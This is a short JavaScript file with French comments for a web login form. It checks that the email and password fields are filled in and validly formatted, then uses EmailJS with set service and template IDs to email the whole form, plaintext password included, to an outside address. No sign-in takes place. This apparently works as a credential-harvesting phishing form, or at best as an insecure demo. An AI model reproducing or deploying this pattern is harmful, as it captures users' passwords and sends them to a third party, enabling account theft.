// Initialise EmailJS avec votre User ID
emailjs.init("your-public-api-key"); // Remplacez par votre clé API EmailJS

// Fonction de validation du formulaire
function validateForm() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const errorMessage = document.getElementById('errorMessage');

    // Validation simple pour démonstration
    if (email === "" || password === "") {
        errorMessage.textContent = "Veuillez remplir tous les champs.";
        return false;
    }

    // Validation du format d'email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Veuillez entrer une adresse e-mail valide.";
        return false;
    }

    // Effacer le message d'erreur si tout est correct
    errorMessage.textContent = "";
    return true; // Permettre l'envoi du formulaire si la validation réussit
}

// Gestion de la soumission du formulaire
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Empêche le comportement par défaut du formulaire

    // Valider le formulaire avant l'envoi
    if (!validateForm()) {
        return; // Ne pas envoyer le formulaire si la validation échoue
    }

    console.log("Validation réussie, préparation à l'envoi..."); // Log pour le débogage

    // Envoie le formulaire avec EmailJS
    emailjs.sendForm('service_odtxz18', 'template_pj35ygs', this)
        .then(function(response) {
            console.log('Succès:', response);
            alert('Formulaire envoyé avec succès!');
        }, function(error) {
            console.log('Erreur:', error);
            alert('Une erreur est survenue. Veuillez réessayer.');
        });
});
